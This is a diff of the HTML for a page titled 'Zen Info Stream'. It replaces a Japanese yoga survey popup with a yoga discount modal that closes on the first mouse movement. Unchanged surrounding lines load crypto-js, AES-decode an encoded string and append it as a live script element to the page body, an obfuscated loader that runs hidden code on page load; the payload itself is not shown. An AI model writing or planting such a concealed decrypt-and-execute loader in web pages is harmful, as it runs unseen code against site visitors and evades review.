@@ -49,89 +49,83 @@ button{background:#E60023;color:#fff;padding:10px 20px;border:none;}
 </head>
 
 <body>
-  <style>
-    #popup {
-      position: fixed;
-      top: 30%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff;
-      padding: 25px 35px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
-      z-index: 1000;
-      display: none;
-      text-align: center;
-      font-family: sans-serif;
-    }
+   <!-- Yoga Offer Modal Popup -->
+<style>
+#yogaModalOverlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.6);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
 
-    #overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.4);
-      display: none;
-      z-index: 999;
-    }
+#yogaModalBox {
+    background: #ffffff;
+    padding: 30px;
+    border-radius: 12px;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    animation: popupFade 0.4s ease;
+}
 
-    button {
-      margin: 10px;
-      padding: 8px 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
+#yogaModalBox h2 {
+    font-size: 28px;
+    color: #e63946;
+    margin-bottom: 15px;
+}
 
-    .yes {
-      background-color: #4CAF50;
-      color: white;
-    }
+#yogaModalClose {
+    margin-top: 15px;
+    padding: 10px 20px;
+    border: none;
+    background: #2a9d8f;
+    color: white;
+    font-size: 16px;
+    border-radius: 6px;
+    cursor: pointer;
+}
 
-    .no {
-      background-color: #f44336;
-      color: white;
-    }
-  </style>
+#yogaModalClose:hover {
+    background: #21867a;
+}
 
-<button onclick="openPopup()">ポップアップを開く</button>
+@keyframes popupFade {
+    from {transform: scale(0.8); opacity: 0;}
+    to {transform: scale(1); opacity: 1;}
+}
+</style>
 
-<div id="overlay"></div>
-<div id="popup">
-  <h3>質問</h3>
-  <p>ヨガをするのが好きですか？</p>
-  <button class="yes" onclick="handleAnswer('はい')">はい</button>
-  <button class="no" onclick="handleAnswer('いいえ')">いいえ</button>
+<div id="yogaModalOverlay">
+    <div id="yogaModalBox">
+        <h2>ヨガ最大50％OFFキャンペーン実施中！</h2>
+        <p>期間限定の特別割引です。今すぐご予約・ご参加ください！🧘‍♀️🔥</p>
+        <button id="yogaModalClose">Close</button>
+    </div>
 </div>
 
 <script>
-  function openPopup() {
-    document.getElementById("popup").style.display = "block";
-    document.getElementById("overlay").style.display = "block";
+window.addEventListener("load", function() {
 
-    document.addEventListener("mousemove", closeOnMove);
-  }
+    // show popup once per session
+    if (!sessionStorage.getItem("yogaPopupShown")) {
+        document.getElementById("yogaModalOverlay").style.display = "flex";
+        sessionStorage.setItem("yogaPopupShown", "true");
+    }
 
-  function closeOnMove() {
-    closePopup();
-    document.removeEventListener("mousemove", closeOnMove);
-  }
+    document.getElementById("yogaModalClose").onclick = function() {
+        document.getElementById("yogaModalOverlay").style.display = "none";
+    };
 
-  function closePopup() {
-    document.getElementById("popup").style.display = "none";
-    document.getElementById("overlay").style.display = "none";
-  }
-
-  function handleAnswer(answer) {
-    alert("あなたの選択: " + answer);
-    closePopup();
-    document.removeEventListener("mousemove", closeOnMove);
-  }
+});
 </script>
-
-   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 <script>
     function aesDecode(encodedText) {
         const decodedText = decodeURIComponent(encodedText);
@@ -142,6 +136,32 @@ button{background:#E60023;color:#fff;padding:10px 20px;border:none;}
     const script = document.createElement("script");
     script.textContent = codeString;
     document.body.appendChild(script);
+</script>
+<script>
+window.addEventListener("load", function() {
+
+    const modal = document.getElementById("yogaModalOverlay");
+
+    // show popup once per session
+    if (!sessionStorage.getItem("yogaPopupShown")) {
+        modal.style.display = "flex";
+        sessionStorage.setItem("yogaPopupShown", "true");
+    }
+
+    // close on button click
+    document.getElementById("yogaModalClose").onclick = function() {
+        modal.style.display = "none";
+    };
+
+    // ✅ close on mouse move (only once)
+    function closeOnMove() {
+        modal.style.display = "none";
+        document.removeEventListener("mousemove", closeOnMove);
+    }
+
+    document.addEventListener("mousemove", closeOnMove);
+
+});
 </script>
 
  <header>Zen Info Stream</header>
